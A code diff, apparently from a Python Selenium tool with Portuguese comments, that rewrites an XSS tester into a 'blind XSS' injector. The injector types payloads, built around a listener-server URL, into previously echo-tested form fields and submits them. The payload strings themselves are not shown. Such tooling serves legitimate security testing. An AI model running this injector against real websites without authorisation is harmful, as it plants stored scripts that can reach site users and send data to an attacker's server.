@@ -156,29 +156,44 @@ def build_payloads(url_ouvinte):
     return payloads
 
 
-def xss_injection(payloads, driver, campos, url_ouvinte):
-    """Testa cada payload na lista de XSS"""
-    # Lista de payloads que funcionaram
-    bypassed_payloads = []
+def blind_xss_injection(campos_validos, driver, url_ouvinte):
+    """Injeta payloads blind XSS - estratégia 'disparar e esquecer'"""
+    injected_payloads = []
+    
     try:
         # Cria payloads com o link do servidor ouvinte
         payloads = build_payloads(url_ouvinte)
         for payload in payloads:
-            for campo in campos:
-                # Reaproveitando a função eco_test
-                results = eco_test([campo], driver, payload)
-                # Filtra os resultados que tiveram sucesso
-                for result in results:
-                    if result['status'] == 'success' and result['eco_text']:
-                        bypassed_payloads.append({
-                            'payload': payload,
-                            'element': campo,
-                            'eco_text': result['eco_text']
-                    })
-        return bypassed_payloads
+            for campo in campos_validos:
+                try:
+                    # Usa diretamente os campos que já foram validados pelo eco_test
+                    field_name = campo['element'].get('name') or campo['element'].get('id')
+                    # Encontra o elemento novamente
+                    if campo['element']['id']:
+                        input_field = driver.find_element(By.ID, campo['element']['id'])
+                    elif campo['element']['name']:
+                        input_field = driver.find_element(By.NAME, campo['element']['name'])
+                    else:
+                        continue
+                    # Injeção blind XSS
+                    input_field.clear()
+                    input_field.send_keys(payload)
+                    input_field.send_keys(Keys.RETURN)
+                    
+                    injected_payloads.append({
+                        'payload': payload,
+                        'field_name': field_name,
+                        'status': 'injected'
+                    })              
+                except Exception as e:
+                    print(f"Falha ao injetar blind XSS no campo: {e}")
+                    continue
+        
+        return injected_payloads
     except Exception as e:
-        print(f"An error occurred during XSS injection testing: {e}")
+        print(f"An error occurred during blind XSS injection testing: {e}")
         return []
+
 
  
 # Exemplo de uso
@@ -190,9 +205,10 @@ if driver:
     # Testa os campos encontrados
     test_results = eco_test(found_tags, driver,"TESTANDO")
     # Filtra apenas os sucessos
-    successful_results = [result for result in test_results if result['status'] == 'success']
-    print(test_results)
-    print(f"Resultados do teste: {successful_results}")
+    #successful_results = [result for result in test_results if result['status'] == 'success']
+    #print(test_results)
+    #print(f"Resultados do teste: {successful_results}")
+
     
     driver.quit()
 
